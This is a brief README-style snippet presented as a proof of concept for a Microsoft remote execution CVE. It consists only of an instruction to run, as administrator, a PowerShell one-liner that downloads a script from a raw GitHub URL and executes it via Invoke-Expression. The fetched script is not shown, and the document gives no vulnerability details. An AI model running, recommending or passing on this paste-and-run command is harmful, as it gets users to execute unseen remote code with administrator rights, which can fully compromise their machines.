## MS remote execution CVE POC...

run this as administrator:

```powershell
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabixx/runsomethingfromthecloud/main/run.ps1").Content
